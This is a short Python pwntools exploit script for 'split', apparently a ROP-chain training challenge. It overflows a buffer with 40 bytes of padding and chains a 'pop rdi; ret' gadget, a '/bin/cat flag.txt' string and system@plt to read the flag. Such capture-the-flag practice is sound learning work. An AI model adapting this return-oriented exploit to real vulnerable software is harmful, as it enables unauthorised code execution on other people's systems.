#!/usr/bin/python
from pwn import *
import struct

# System.plt @ 0x4005e0
# /bin/cat   @ 0x601060 

# 0x0000000000400883: pop rdi; ret; 

elf = ELF('split')

pad = 'A'*40 # RSP overwrite @ 40
ropchain  = struct.pack('<Q', 0x400883) # pop rdi; ret;
ropchain += struct.pack('<Q', 0x601060) # /bin/cat flag.txt
ropchain += struct.pack('<Q', 0x4005e0) # System.plt @ usefulFunction
exploit = pad + ropchain

io = process(elf.path)
io.recv()
io.sendline(exploit)

flag = io.recv()
success(flag)
